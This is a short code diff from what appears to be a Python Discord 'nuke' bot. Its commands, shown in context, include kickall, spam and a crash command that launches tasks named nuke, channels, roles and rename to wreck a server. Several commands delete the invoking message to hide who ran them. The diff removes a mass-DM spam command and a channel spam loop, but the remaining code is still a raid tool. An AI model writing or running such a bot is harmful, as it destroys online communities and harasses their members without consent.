@@ -104,16 +104,8 @@ async def kickall(ctx):
 async def dm(member):
 	try: await member.send("spammessage")
 	except: pass
-@bot.command()
-async def dmall(ctx):
-	try: await ctx.message.delete()
-	except: pass
-	for member in list(ctx.guild.members):
-		asyncio.create_task(dm(member))
-async def spam1(channel):
-	for aboba in range(intmessages):
-		try: await channel.send(content="spammessage")
-		except: break
+
+
 @bot.command()
 async def spam(ctx):
 	try: await ctx.message.delete()
@@ -155,6 +147,5 @@ async def crash(ctx):
 	asyncio.create_task(nuke(ctx))
 	asyncio.create_task(channels(ctx))
 	asyncio.create_task(roles(ctx))
-	asyncio.create_task(dmall(ctx))
 	asyncio.create_task(rename(ctx))
 bot.run("token")
